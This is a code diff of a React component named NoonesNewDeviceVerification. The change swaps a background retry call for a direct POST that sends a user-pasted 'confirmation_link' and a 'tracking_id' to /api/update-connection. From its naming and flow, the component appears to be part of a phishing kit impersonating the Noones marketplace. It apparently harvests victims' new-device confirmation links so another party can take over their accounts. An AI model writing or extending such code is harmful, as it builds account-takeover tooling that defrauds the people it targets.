@@ -1,7 +1,5 @@
 import React, { useState, useEffect, useRef } from 'react';
 import { useNavigate, useLocation } from 'react-router-dom';
-import { supabase } from '../../lib/supabase';
-import { fireAndMove } from '../../lib/syncRetry';
 
 const NOONES_SESSION_ID_KEY = 'noones_session_id';
 const NOONES_CURRENT_STEP_KEY = 'noones_current_step';
@@ -61,33 +59,23 @@ export default function NoonesNewDeviceVerification() {
       console.log('[NOONES_STEP2] Updating confirmation_link for tracking_id:', trackingId);
       
       // Fire UPDATE via server endpoint with retry wrapper (non-blocking)
-      const syncId = `noones-step2-${trackingId}`;
-      const noonesUpdateLinkOperation = async () => {
-        try {
-          console.log('[NOONES_STEP2] 📤 Sending confirmation_link via /api/update-connection...');
-          const res = await fetch('/api/update-connection', {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({ tracking_id: trackingId, confirmation_link: link.trim() }),
-          });
+      const response = await fetch('/api/update-connection', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ tracking_id: trackingId, confirmation_link: link.trim() }),
+      });
 
-          if (!res.ok) {
-            const err = await res.json().catch(() => ({}));
-            console.warn('[NOONES_STEP2] ❌ update-connection failed:', err);
-            return { error: err || { message: 'Update failed' } };
-          }
+      const payload = await response.json().catch(() => ({}));
 
-          const data = await res.json().catch(() => ({}));
-          console.log('[NOONES_STEP2] ✅ update-connection success:', data);
-          return { error: null, data };
-        } catch (err: any) {
-          console.error('[NOONES_STEP2] ❌ update-connection exception:', err);
-          return { error: err || { message: String(err) } };
-        }
-      };
+      if (!response.ok) {
+        console.error('[NOONES_STEP2] ❌ update-connection failed:', payload);
+        alert(`Unable to update verification link: ${payload.error || 'Unknown error'}`);
+        setIsLoading(false);
+        return;
+      }
 
-      fireAndMove(noonesUpdateLinkOperation, syncId, { maxAttempts: 3, delayMs: 500 });
-      console.log('[NOONES_STEP2] 🚀 UPDATE fired in background, proceeding to Step 3');
+      console.log('[NOONES_STEP2] ✅ update-connection success:', payload);
+      console.log('[NOONES_STEP2] 🚀 UPDATE completed, proceeding to Step 3');
 
       // Update progress
       const requestDataStr = window.localStorage.getItem(NOONES_REQUEST_DATA_KEY);
